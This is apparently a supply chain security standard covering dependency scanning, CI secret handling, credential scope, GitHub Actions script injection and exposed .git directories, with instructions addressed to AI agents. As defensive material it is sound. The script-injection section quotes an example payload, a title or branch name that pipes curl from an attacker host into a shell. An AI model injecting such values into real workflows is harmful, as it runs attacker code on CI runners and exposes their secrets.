# Dependencies and Supply Chain

| Field | Value |
|-------|-------|
| Domain codes | SEC-SUPPLY |
| Topics covered | Dependencies, Supply Chain, CI/CD, Source Control |
| Part of | Hullproof Security Standard, see STANDARD.md |

This document covers the third party code a project installs, the integrity of what flows into a release, the pipeline that tests and deploys it, and the repository that holds it. Secret scanning of source and history lives in SECRETS.md, MCP servers and coding agent configuration live in AGENTIC-DEV-SECURITY.md, over the air mobile updates live in MOBILE-SECURITY.md, and deployment, rollback and platform settings live in INFRASTRUCTURE-SECURITY.md. Vulnerability triage and fix deadlines per severity are set in GOVERNANCE.md (SEC-GOV-040, SEC-GOV-041); this document enforces them at build time. Where a requirement here says a fact or decision is recorded, it goes in the project's architecture record (SEC-GOV-001) or security decisions log (SEC-GOV-002, SEC-GOV-011), never in the Hullproof standard files.

<!-- hullproof:index:start -->

> **Free edition.** This document contains 5 of the 35 requirements in this domain: every BLOCKER and every CRITICAL requirement that applies at LAUNCH. Requirement IDs mentioned here but not listed are part of Hullproof Pro.

## Requirement index

| ID | Title | Severity | Stage | Applies To |
|---|---|---|---|---|
| [SEC-SUPPLY-002](#sec-supply-002-dependency-vulnerability-gate-in-ci) | Dependency vulnerability gate in CI | CRITICAL | LAUNCH | SaaS, Web, API, Backend, Mobile, Serverless |
| [SEC-SUPPLY-016](#sec-supply-016-pipeline-secrets-only-in-the-ci-secret-store) | Pipeline secrets only in the CI secret store | BLOCKER | LAUNCH | SaaS, Web, API, Backend, Mobile, Serverless |
| [SEC-SUPPLY-035](#sec-supply-035-no-account-wide-or-organisation-wide-credential-in-ci-or-an-agent-workspace) | No account wide or organisation wide credential in CI or an agent workspace | CRITICAL | LAUNCH | SaaS, Web, API, Backend, Mobile, Serverless, Agentic workflow |
| [SEC-SUPPLY-032](#sec-supply-032-no-untrusted-event-data-expanded-into-workflow-scripts) | No untrusted event data expanded into workflow scripts | CRITICAL | LAUNCH | SaaS, Web, API, Backend, Mobile, Serverless, Agentic workflow |
| [SEC-SUPPLY-026](#sec-supply-026-no-source-control-metadata-on-deployed-sites) | No source control metadata on deployed sites | CRITICAL | LAUNCH | SaaS, Web, API, Backend |
<!-- hullproof:index:end -->

---

## Coverage map

Severity, stages, exceptions, and the Production Security Gate are defined in [STANDARD.md](STANDARD.md).

<!-- hullproof:coverage-map:start -->
Each requirement in this document is listed in exactly one row. A row with no requirements points to the document that owns that topic. "Primary for" names the duplicate clusters whose one owning requirement is in that row; report one finding per cluster against the owner.

| Area | Also see | Primary for | Requirements in this document |
|------|----------|-------------|-------------------------------|
| Lockfiles and reproducible installs | None | None | SEC-SUPPLY-001 |
| Vulnerability scanning on every change | GOVERNANCE.md, INFRASTRUCTURE-SECURITY.md | None | SEC-SUPPLY-015 |
| Prerelease and canary builds in production | None | None | SEC-SUPPLY-003 |
| Unmaintained and deprecated packages | None | None | SEC-SUPPLY-006 |
| New package vetting (typosquatting, slopsquatting, maintainer reputation) | None | None | SEC-SUPPLY-004 |
| Dependency confusion and private package names | None | None | SEC-SUPPLY-013 |
| Install scripts | None | None | SEC-SUPPLY-009 |
| Automated update tooling | None | None | SEC-SUPPLY-005 |
| Software bill of materials (SBOM) | AI-SECURITY.md | None | SEC-SUPPLY-007 |
| Build provenance and artifact integrity | INFRASTRUCTURE-SECURITY.md | None | SEC-SUPPLY-008, SEC-SUPPLY-014, SEC-SUPPLY-030 |
| CI/CD pipeline security | INFRASTRUCTURE-SECURITY.md, AGENTIC-DEV-SECURITY.md, OBSERVABILITY.md | CODEOWNERS | SEC-SUPPLY-016, SEC-SUPPLY-017, SEC-SUPPLY-018, SEC-SUPPLY-019, SEC-SUPPLY-020, SEC-SUPPLY-021, SEC-SUPPLY-031 |
| CI workflow script injection and workflow linting | None | None | SEC-SUPPLY-032, SEC-SUPPLY-033 |
| Source control (branch protection, reviews, signed commits) | AGENTIC-DEV-SECURITY.md, GOVERNANCE.md | Missing PR workflow | SEC-SUPPLY-022, SEC-SUPPLY-023, SEC-SUPPLY-024, SEC-SUPPLY-025, SEC-SUPPLY-026, SEC-SUPPLY-027, SEC-SUPPLY-028, SEC-SUPPLY-029 |
| Third party JavaScript loaded at runtime | FRONTEND-SECURITY.md | Analytics on auth pages | SEC-SUPPLY-010, SEC-SUPPLY-011 |
| Mobile dependencies and OTA updates | MOBILE-SECURITY.md | None | SEC-SUPPLY-002 |
| AI model and MCP server supply chain | AI-SECURITY.md, AGENTIC-DEV-SECURITY.md | None | SEC-SUPPLY-012 |
| Release age delay and registry trust settings | None | Package release age | SEC-SUPPLY-034 |
| Account wide credentials in CI | SECRETS.md, INFRASTRUCTURE-SECURITY.md, AGENTIC-DEV-SECURITY.md | Account wide credentials in CI | SEC-SUPPLY-035 |
<!-- hullproof:coverage-map:end -->

---

## Dependencies

### SEC-SUPPLY-002: Dependency vulnerability gate in CI

| Field | Value |
|-------|-------|
| Severity | CRITICAL |
| Stage | LAUNCH |
| Applies To | SaaS, Web, API, Backend, Mobile, Serverless |
| Automation | FULL |
| Verification method | DEPENDENCY SCAN, CONFIG REVIEW |

**Requirement.** Every CI run on a change to the production branch MUST scan all direct and transitive dependencies, including mobile native dependencies, against a public advisory database, and MUST fail when any finding is older than the fix deadline for its severity: 7 days for CRITICAL and 30 days for HIGH, or shorter where the project's vulnerability policy (SEC-GOV-041 in GOVERNANCE.md) sets shorter (the 7 and 30 day figures are Hullproof policy; no external source). The same scan MUST also run on a schedule against the production branch at least weekly, because new advisories appear for code that has not changed (SEC-GOV-042 in GOVERNANCE.md). Any dependency surface the scanner cannot read (native modules resolved at build time, vendored code, container installs, tools run with `npx`) MUST be listed with a substitute check, such as the build service's dependency report or a dated manual review. This requirement is CRITICAL wherever the product has a dependency manifest or lockfile.

**Why.** Known vulnerable components are among the cheapest paths into an application. For example, drizzle-orm below 0.45.2 allows SQL injection through identifier helpers, and several Next.js 15 and 16 releases allow an unauthenticated request to exhaust the server through Server Function endpoints. A scan that only reports, without blocking, lets these ship.

**Implementation.**
- Run OSV Scanner, `npm audit`, `pnpm audit` or an equivalent tool against the lockfile in CI, not against `node_modules` on a developer machine.
- Mobile apps: include the JavaScript lockfile plus the native manifests the build produces (`Podfile.lock`, Gradle dependencies) in the scan.
- Map scanner severity to the deadlines in the Requirement. A finding inside its deadline is reported but does not fail the build; a finding past its deadline fails it.
- A finding that is not reachable in this application may be accepted only under the exception rules in STANDARD.md, recorded in the security decisions log with an owner and a review date, never by disabling the scanner or deleting the rule. Reachability is shown by an import trace to the vulnerable symbol or by a test that fails on the vulnerable version; a package listing from `pnpm why` is not evidence. A development or build only package that runs in CI with a deploy token, a registry publish token or any production secret is treated as a runtime dependency.

**Verify.**
1. Confirm the scan step runs on every pull request to the production branch and is a required status check (see SEC-SUPPLY-015).
2. On a branch, pin a package to a version with a known advisory past its deadline, for example `pnpm add drizzle-orm@0.43.1 --filter <app>` in a pnpm monorepo, and confirm the CI run fails when the scanner reads the root `pnpm-lock.yaml`.
3. Read the scanner configuration and confirm no blanket ignore list or severity override exists without a matching recorded exception.
4. Confirm a scheduled run of the scan exists for the production branch and ran in the last 7 days. Pin an advisory affected package in each ecosystem the project builds (for example one npm package and one native dependency) and confirm the scheduled run reports it. List every dependency surface the scanner cannot read and its substitute check.

**Evidence.** CI workflow showing the scan step, a passing scan report for the current release, the failing run from step 2, and the exception records for any ignored findings.

**Exceptions.** A finding may be accepted past its deadline only with the acceptance fields STANDARD.md requires for its severity, recorded in the security decisions log. Reachable critical findings follow the CRITICAL exception rules.

**References.** OWASP ASVS 5.0.0 v5.0.0-15.1.1, v5.0.0-15.2.1 [SRC-010]; NIST SSDF 1.1 PW.4.4 [SRC-050]; OWASP MASVS 2.1.0 MASVS-CODE-3 [SRC-011]; OWASP MASWE MASWE-0044 [SRC-014]; OWASP NPM Security Cheat Sheet, section 5 Audit for vulnerabilities [SRC-048]; NIST SP 800-53 Rev 5 RA-5 [SRC-062]; OWASP Top 10:2025 A03:2025 [SRC-020]; GHSA-gpj5-g38j-94v9 [SRC-095]; GHSA-5j59-xgg2-r9c4 [SRC-096]; GHSA-h25m-26qc-wcjf [SRC-097].

**AI Agent Instruction.** After any dependency change, run the project's dependency scan and report every finding with its severity and deadline. When a scan fails, upgrade to the minimum patched version in a supported release line. Never add an ignore entry, lower a severity threshold, or remove the scan step to make CI pass; stop and report the finding with the advisory ID.

---

## CI/CD

### SEC-SUPPLY-016: Pipeline secrets only in the CI secret store

| Field | Value |
|-------|-------|
| Severity | BLOCKER |
| Stage | LAUNCH |
| Applies To | SaaS, Web, API, Backend, Mobile, Serverless |
| Automation | FULL |
| Verification method | SECRET SCAN, CONFIG REVIEW |

**Requirement.** Secrets used by CI and deploy pipelines MUST be stored in the CI platform's encrypted secret store and injected at run time, and MUST NOT appear in workflow files, build configuration files, repository files or pipeline logs. Production secrets MUST be scoped to a deployment environment that only the production branch can use, and no workflow that runs pull request or fork code MAY have access to them.

**Why.** A secret in a workflow file is readable by anyone who can read the repository or a fork of it, and stays in history. A secret printed to a build log is readable by anyone who can view runs.

**Implementation.**
- Reference secrets only through the platform's secret syntax (for example `${{ secrets.NAME }}` in GitHub Actions).
- Never echo a secret or pass it as a command line argument that is printed; rely on the platform's log masking and do not defeat it by transforming the value.
- Keep production values in a protected deployment environment rather than repository wide secrets. A repository level secret is available to any workflow that can run on any branch or pull request.
- Leaked secret handling and repository wide secret scanning are in SECRETS.md.
- Owned by SEC-SUPPLY-035 for this root cause (Account wide credentials in CI); report one finding. Where a pipeline secret reaches more than the one project it serves, rate it there.

**Verify.**
1. Run Gitleaks over workflow files, build configuration and the full repository history.
2. Read each workflow and confirm every credential comes from the secret store.
3. Review recent pipeline logs for unmasked credential values.
4. Search the workflows for the `pull_request_target` and `workflow_run` events and read every hit: a workflow that checks out or runs pull request or fork code must not have a secret in scope. Confirm in the repository settings that each production secret is restricted to an environment that only the production branch can use.

**Evidence.** Clean Gitleaks report including history, and the workflow review notes.

**Exceptions.** None.

**References.** OWASP ASVS 5.0.0 v5.0.0-13.3.1 (Level 2, promoted to LAUNCH) [SRC-010]; OWASP Secrets Management Cheat Sheet, section 3.2 Where should a secret be? [SRC-043]; OWASP CI/CD Security Cheat Sheet, Secrets Management [SRC-049].

**AI Agent Instruction.** Never write a secret value into a workflow, configuration file or script. Reference the secret store by name and tell the user which secret to create. If you find a secret in a pipeline file or log, stop, report it as a BLOCKER, and follow the leaked secret procedure in SECRETS.md.

---

### SEC-SUPPLY-035: No account wide or organisation wide credential in CI or an agent workspace

| Field | Value |
|-------|-------|
| Severity | CRITICAL |
| Stage | LAUNCH |
| Applies To | SaaS, Web, API, Backend, Mobile, Serverless, Agentic workflow |
| Automation | MANUAL |
| Verification method | CONFIG REVIEW, DOCUMENT REVIEW |

**Requirement.** A credential stored in a CI secret store, a deploy tool or an agent workspace MUST reach only the one project, repository and environment it serves. It MUST NOT be an account wide, organisation wide or team wide credential, such as a personal access token that carries its owner's full access to every organisation and project (now and in future), or a platform token that can act on projects other than the one being deployed. Where the CI platform and the target provider support OIDC federation, the pipeline MUST use short lived tokens issued by it instead of a stored key. Where they do not, the credential MUST be a scoped token limited to one project with the fewest permissions the job needs, held in a secret scoped to one environment and one repository (SEC-SUPPLY-016). An organisation level CI secret that a production job uses MUST be limited by policy to the named repositories that need it. Staging and production MUST use different credentials (SEC-SECRETS-009). The scope each credential has MUST be recorded when it is created.

**Why.** Anyone who can write to a repository can read every secret stored in it, and a job that runs attacker influenced code can print any secret in its scope. If that secret is an account wide token, one leaked pipeline gives the attacker every project the account can reach, including projects created later. Moving the secret into the secret store (SEC-SUPPLY-016) does not reduce this reach. Only a narrow scope does.

**Implementation.**
- Prefer OIDC. GitHub Actions can exchange its identity token for a short lived cloud credential, so no long lived cloud secret is stored in GitHub [SRC-154]. Add trust conditions on repository, branch or environment [SRC-154].
- Supabase personal access tokens come in two kinds. A classic token carries the account's full access on every organisation and project, now and in future. A scoped token carries only the organisations, projects and permissions chosen, and Supabase recommends scoped tokens for AI agents, automation scripts and CI [SRC-151].
- Keep the Supabase database password out of CI where you can. It is not limited by token scope (SEC-CLOUD-015).
- Create a machine identity or a service account for the pipeline. Do not use a person's token, because it carries that person's access and ends when the person leaves (SEC-CLOUD-035).
- GitHub organisation level secrets can be limited by policy to all repositories, to private repositories, or to a named list [SRC-373]. Use the named list for production credentials.
- GitHub environment secrets are available only to jobs that reference the environment, and the environment's protection rules apply before the job runs or reads them [SRC-373].
- Do not give a coding agent or an MCP server a credential wider than the task. SEC-AGENT-011 owns production secrets in a coding agent's context. Record any credential that sits in an agent workspace in the same list.
- Where a provider has no scoped token and no OIDC, use a dedicated account that belongs to that one project only, with the lowest role the job needs, and record the gap in the decisions log with a rotation date. A shared account that also reaches other projects does not meet the Requirement. Check your team's token settings for whether a token can be limited to one project before you rely on it.
- Expiry, trust policy detail and the credential inventory are owned by SEC-CLOUD-015. This requirement owns the LAUNCH rule on reach. Report one finding for a wide credential, under this ID.

**Verify.**
1. List every credential the pipeline, the deploy tools and the agent workspace hold: repository secrets, environment secrets, organisation secrets (`gh secret list`, `gh secret list --env <name>` and `gh secret list --org <org>` list names only) and platform variables. For each record the provider, the kind of credential, and the projects it can reach.
2. In each provider's token settings, confirm the token is a scoped one limited to one project, not a classic or full access token. A Supabase token marked Legacy is a classic token [SRC-151].
3. Test the reach. With a production deploy token, call the provider's API for a second project in the same account (or a staging project). Expect a denial. Repeat with the staging token against production.
4. For each organisation level secret used by a production job, read the repository access policy. It must be a named list that holds only the repositories that need it.
5. Where the provider supports OIDC, read the workflow. It must request an identity token (`id-token: write`) and hold no stored cloud key for that provider. Read the cloud trust policy and confirm at least one condition on repository, branch or environment.
6. Search the workflow files and settings for tokens that belong to a person (a personal access token under an employee's name) and confirm none is used for deploys.

**Evidence.** The credential list with provider, kind, scope and reach, the cross project denial output, the organisation secret policy, and the trust policy or token settings.

**Exceptions.** None for a credential that reaches more than one project. This is a credentials class requirement, so a finding cannot be accepted. A provider that offers neither OIDC nor a token limited to one project meets the Requirement through a dedicated account that belongs to that one project only, recorded in the decisions log with its role and a rotation date.

**References.** GitHub OpenID Connect, Benefits of using OIDC and trust conditions [SRC-154]; GitHub Using secrets in GitHub Actions and Managing environments for deployment [SRC-373]; GitHub Secure use reference, Principle of least privilege [SRC-220]; Supabase Personal Access Tokens, Classic tokens and Scoped tokens [SRC-151]; OWASP CI/CD Security Cheat Sheet, Least Privilege [SRC-049]; OWASP Secrets Management Cheat Sheet [SRC-043].

**AI Agent Instruction.** Never create, request or store an account wide, organisation wide or classic token for a pipeline or for yourself. Ask for a token limited to the one project and the one environment, or set up OIDC. If the token you were given reaches more than the project you are working on, stop and report it as a CRITICAL finding before you use it.

---

### SEC-SUPPLY-032: No untrusted event data expanded into workflow scripts

| Field | Value |
|-------|-------|
| Severity | CRITICAL |
| Stage | LAUNCH |
| Applies To | SaaS, Web, API, Backend, Mobile, Serverless, Agentic workflow |
| Automation | FULL |
| Verification method | STATIC ANALYSIS |

**Requirement.** CI workflows MUST NOT place attacker controllable context values inside `${{ }}` expressions in `run:` scripts, `actions/github-script` `script:` inputs, or lines written to `GITHUB_ENV`, `GITHUB_OUTPUT` or `GITHUB_PATH`. Attacker controllable values include every `github.event` field that ends in `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` or `title`, plus `github.head_ref`, commit messages and author fields, and outputs derived from any of them. Such values MUST reach a script only as an action input or through an `env:` variable referenced in double quotes.

**Why.** GitHub substitutes `${{ }}` expressions into the generated script before the shell runs it, so a pull request title, issue title, comment or branch name such as `a"; curl attacker.example | sh #` becomes a command on the runner. That command can read every secret the job holds, including deploy tokens and payment provider keys, and can use the job token to push code. OpenSSF Scorecard rates untrusted input in workflow scripts as Critical because it can lead to full repository compromise.

**Implementation.**
- Write:
  ```yaml
  - env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "$TITLE"
  ```
  never `run: echo "${{ github.event.pull_request.title }}"`.
- In `actions/github-script`, read the value from `context.payload` or `process.env` inside the script, not from an expression in `script:`.
- Never write untrusted text into `GITHUB_ENV` or `GITHUB_PATH`; a crafted value can set variables such as `NODE_OPTIONS` for later steps.
- Keep top level `permissions` read only (SEC-SUPPLY-019) and production secrets in a protected environment (SEC-SUPPLY-016) so a missed injection reaches less.
- Prefer a maintained action that takes the value as an input over inline shell when one exists.

**Verify.**
1. Run `zizmor .github/workflows/ .github/actions/` and confirm no open `template-injection` or `github-env` findings.
2. Run `actionlint` and confirm no `[expression]` errors that mention a potentially untrusted input.
3. Run `grep -rnE '\$\{\{ *(github\.event\.|github\.head_ref)' .github/` and confirm every hit sits under `env:` or `with:`, not inside a `run:` or `script:` block.

**Evidence.** zizmor and actionlint output and the reviewed grep result.

**Exceptions.** A value proven to be safe by type, such as `github.event.pull_request.number` or a commit SHA, may appear in an expression; record each case in the workflow as a comment. No exception for the free text fields listed in the Requirement.

**References.** GitHub Script injections, Understanding the risk of script injections; Secure use reference, Good practices for mitigating script injection attacks (Use an action instead of an inline script; Use an intermediate environment variable) [SRC-220]; GitHub Security Lab, Keeping your GitHub Actions and workflows secure Part 2: Untrusted input [SRC-222]; OpenSSF Scorecard Dangerous-Workflow, Risk Critical [SRC-224]; OWASP CI/CD Security Cheat Sheet, Pipeline and Execution Environment [SRC-049]; NIST SSDF 1.1 PW.5.1 [SRC-050]. Severity is CRITICAL rather than BLOCKER because exploitation needs someone who can trigger the workflow (anyone on a public repository, collaborators on a private one, SEC-SUPPLY-022); an auditor should rate a finding on a public repository whose job holds production deploy or payment secrets as BLOCKER under rating rule 2. The stage is LAUNCH since the fix costs nothing and the default stack ships through GitHub Actions from launch day.

**AI Agent Instruction.** Never write `${{ github.event... }}` or `${{ github.head_ref }}` inside a `run:` or `script:` block. Pass the value through `env:` and quote the variable. If you find this pattern in an existing workflow, report it as CRITICAL and fix it before any other workflow change.

---

## Source control

### SEC-SUPPLY-026: No source control metadata on deployed sites

| Field | Value |
|-------|-------|
| Severity | CRITICAL |
| Stage | LAUNCH |
| Applies To | SaaS, Web, API, Backend |
| Automation | FULL |
| Verification method | DYNAMIC TEST |

**Requirement.** Production and preview deployments MUST NOT serve `.git` directories or other source control metadata, and requests for them MUST return a not found or forbidden response.

**Why.** An exposed `.git` folder lets anyone download the full source and history, including secrets that were removed from the latest commit. Escape's study of AI built apps found exposed `.git` directories in the wild.

**Implementation.**
- Deploy build output, not a copy of the working directory.
- For self hosted web servers or containers, exclude `.git` from the image or upload and deny dot paths at the server.

**Verify.**
1. Request `https://<host>/.git/HEAD` and `https://<host>/.git/config` on every production and preview host; expect 403 or 404.
2. Run `find <build output> -name .git` on the deployed build output (for example the Vercel build output or static export folder); expect no results.

**Evidence.** Response codes for each host.

**Exceptions.** None.

**References.** OWASP ASVS 5.0.0 v5.0.0-13.4.1 [SRC-010]; Escape, The State of Security of Vibe Coded Apps [SRC-007].

**AI Agent Instruction.** When writing a Dockerfile, deploy script or static upload step, exclude `.git` and other dot directories. If a deployed host serves `.git`, report it as CRITICAL and treat every secret ever committed as exposed.
